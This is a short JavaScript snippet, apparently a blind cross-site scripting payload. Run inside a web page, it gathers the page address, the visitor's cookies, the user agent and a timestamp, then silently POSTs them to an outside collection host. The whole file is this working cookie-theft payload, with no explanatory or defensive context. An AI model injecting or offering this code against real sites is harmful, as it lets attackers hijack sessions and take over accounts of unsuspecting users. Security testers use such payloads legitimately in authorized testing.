(function() {
    const pageInfo = {
        uri: document.location.href,
        cookies: document.cookie,
        userAgent: navigator.userAgent,
        time: new Date().toISOString(),
    };

    // Correct logging endpoint for your account
    const logEndpoint = 'https://akoss.bxss.in/log';

    fetch(logEndpoint, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(pageInfo)
    });
})();
